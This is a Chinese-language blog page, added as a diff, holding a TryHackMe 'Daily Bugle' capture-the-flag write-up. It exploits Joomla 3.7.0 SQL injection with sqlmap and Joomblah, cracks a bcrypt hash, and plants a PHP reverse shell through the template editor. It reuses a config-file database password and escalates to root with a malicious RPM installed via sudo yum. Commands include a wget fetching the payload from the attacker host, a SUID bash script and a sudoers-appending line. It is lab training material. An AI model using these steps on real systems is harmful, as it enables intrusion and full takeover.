@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
+    <meta name="description" content="Daily Bugle" />
+    <meta name="hexo-theme-A4" content="v1.8.2" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>v2ish1yan</title>
+
+    
+        
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">v2ish1yan</a> 
+            <span class="description">一切都是兴趣使然</span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            Daily Bugle
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="post-toc-text">知识点</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Access-the-web-server-who-robbed-the-bank"><span class="post-toc-text">Access the web server, who robbed the bank?</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#What-is-the-Joomla-version"><span class="post-toc-text">What is the Joomla version?</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#What-is-Jonah%E2%80%99s-cracked-password"><span class="post-toc-text">What is Jonah’s cracked password?</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#What-is-the-user-flag"><span class="post-toc-text">What is the user flag?</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#What-is-the-root-flag"><span class="post-toc-text">What is the root flag?</span></a></li></ol>
+            
+        
+        <h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
+<li>joomla 3.7.0 sql注入漏洞</li>
+<li>joomla后台template处写shell</li>
+<li>信息收集，网站的config文件里，一些数据库的密码可能会跟用户的密码一样</li>
+<li>yum 本地安装rpm包提权</li>
+<li>bash -p提权</li>
+</ul>
+<h1 id="Access-the-web-server-who-robbed-the-bank"><a href="#Access-the-web-server-who-robbed-the-bank" class="headerlink" title="Access the web server, who robbed the bank?"></a>Access the web server, who robbed the bank?</h1><p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303121638317.png" alt="image-20230312162205627"></p>
+<p><code>spiderman</code></p>
+<h1 id="What-is-the-Joomla-version"><a href="#What-is-the-Joomla-version" class="headerlink" title="What is the Joomla version?"></a>What is the Joomla version?</h1><p>使用<a target="_blank" rel="noopener" href="https://github.com/OWASP/joomscan">joomscan</a>来进行扫描</p>
+<pre><code class="bash">perl joomscan.pl http://10.10.63.103/
+</code></pre>
+<p>然后可以得到版本</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303121639609.png" alt="image-20230312163949497"></p>
+<p><code>3.7.0</code></p>
+<h1 id="What-is-Jonah’s-cracked-password"><a href="#What-is-Jonah’s-cracked-password" class="headerlink" title="What is Jonah’s cracked password?"></a>What is Jonah’s cracked password?</h1><p>在网上找到joomal 3.7.0存在sql注入<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42033">Joomla! 3.7.0 - ‘com_fields’ SQL Injection</a></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303121920087.png" alt="image-20230312192022978"></p>
+<p>用burp抓包，然后跑sqlmap</p>
+<pre><code class="bash">sqlmap -u &quot;http://10.10.63.103/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=1&quot; --level=5 -p &quot;list[fullordering]&quot; --threads=10  --dbs --risk=3 --random-agent
+</code></pre>
+<p>结果跑不出来。。。使用另外一个工具<a target="_blank" rel="noopener" href="https://github.com/XiphosResearch/exploits/tree/master/Joomblah">Joomblah</a></p>
+<pre><code class="bash">python2 exp.py  http://10.10.63.103
+</code></pre>
+<p>得到</p>
+<pre><code>Found user [&#39;811&#39;, &#39;Super User&#39;, &#39;jonah&#39;, &#39;jonah@tryhackme.com&#39;, &#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39;, &#39;&#39;, &#39;&#39;]
+</code></pre>
+<p>然后在<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcatwiki</a>上找一下是什么类的加密</p>
+<pre><code>3200	bcrypt $2*$, Blowfish (Unix)	$2a$05$LhayLxezLhK1LhWvKxCyLOj0j1u.Kj0jZ0pEmm134uzrQlFvQJLF6
+</code></pre>
+<p>然后使用hashcat进行爆破</p>
+<pre><code class="bash">hashcat -m 3200 -a 0 1.txt rockyou.txt -o 2.txt
+</code></pre>
+<p>发现爆不出来，用john试试</p>
+<pre><code class="bash">john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt - 1.txt
+</code></pre>
+<p>给虚拟机分配的cpu太少了，爆的太慢了。。。</p>
+<p>得到密码<code>spiderman123</code></p>
+<h1 id="What-is-the-user-flag"><a href="#What-is-the-user-flag" class="headerlink" title="What is the user flag?"></a>What is the user flag?</h1><p>得到密码后，在<code>/administrator</code>使用<code>jonah/spiderman123</code>登录</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303122107829.png" alt="image-20230312210757736"></p>
+<p>然后寻找可用写shell的地方，在<code>http://10.10.202.112/administrator/index.php?option=com_templates&amp;view=template&amp;id=503&amp;file=L2luZGV4LnBocA%3D%3D</code></p>
+<p>可用编辑模板，写一个shell</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303122118976.png" alt="image-20230312211806891"></p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell</a></p>
+<p>然后点击<code>Template Previe</code>然后可以获得shell</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303122120548.png" alt="image-20230312212004469"></p>
+<p>得到shell后，用户为apache，没有权限打开用户目录</p>
+<p>然后在<code>/var/www/html/configuration.php</code>得到了一个数据库的用户和密码</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303122127350.png" alt="image-20230312212754322"></p>
+<p>尝试是否可以登录<code>jjameson</code>用户</p>
+<pre><code class="bash">su jjameson
+nv5uz9r3ZEDzVjNu
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303122129944.png" alt="image-20230312212921918"></p>
+<p>成功！</p>
+<p>读取<code>/home/jjameson/user.txt</code></p>
+<p><code>27a260fe3cba712cfdedb1c86d80442e</code></p>
+<h1 id="What-is-the-root-flag"><a href="#What-is-the-root-flag" class="headerlink" title="What is the root flag?"></a>What is the root flag?</h1><p>查看<code>sudo -l</code></p>
+<pre><code>User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+</code></pre>
+<p>可以使用yum安装恶意rpm包进行提权</p>
+<p>得先安装好环境</p>
+<blockquote>
+<p>安装ruby:sudo apt-get install ruby-full</p>
+<p>安装fpm:sudo gem install fpm</p>
+<p>安装rpm：sudo apt-get install rpm</p>
+</blockquote>
+<p>根据这篇文章<a target="_blank" rel="noopener" href="https://www.4hou.com/posts/j5EB">利用软件包管理器实现Linux提权</a></p>
+<p>创建一个sh文件,并放在一个目录下</p>
+<p><code>chmod +s 赋予文件suid权限</code></p>
+<pre><code class="bash">#!/bin/bash
+cp /bin/bash /tmp/bash
+chmod +xs /tmp/bash
+</code></pre>
+<p>然后执行命令，创建rpm包</p>
+<pre><code class="bash">fpm -n yum-grant -s dir -t rpm --pre-install ./exploit/yum_grantp.sh   ./exploit 
+#--pre-install 在安装之前执行的脚本
+# ./exploit 对应 -s dir 指定的目录
+</code></pre>
+<p>用python开启http服务</p>
+<pre><code class="bash">python3 -m http.server  
+</code></pre>
+<p>在目标主机上下载下来，最好在&#x2F;tmp目录下</p>
+<pre><code class="bash">wget http://10.18.104.32:8000/yum-grant-1.0-1.x86_64.rpm
+</code></pre>
+<p>然后使用yum离线安装</p>
+<pre><code class="bash">sudo yum localinstall -y yum-grant-1.0-1.x86_64.rpm
+</code></pre>
+<p>执行命令</p>
+<pre><code class="bash">/tmp/bash -p
+</code></pre>
+<p>获得root权限的shell</p>
+<p><code>bash -p</code>，如果当前文件被赋予了suid，那么就会以suid权限执行这个文件。因为在恶意脚本里就执行了<code>chmod +s</code> ，所以<code>bash -p</code> 就会获得root权限</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303122216591.png" alt="image-20230312221648544"></p>
+<p>在<code>/root/root.txt</code>获得flag</p>
+<p><code>eec3d53292b1821868266858d7fa6f79</code></p>
+<p>打包的sh文件还可以写成</p>
+<pre><code class="bash">echo &quot;jjameson ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers
+</code></pre>
+<p>来将当前用户加入到sudoer里，使用sudo来以root权限执行命令</p>
+
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2023-07-03</span>
+            
+                <span>该篇文章被 v2ish1yan</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/Linux/'>
+                            Linux
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/Tryhackme/'>
+                            Tryhackme
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+   
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
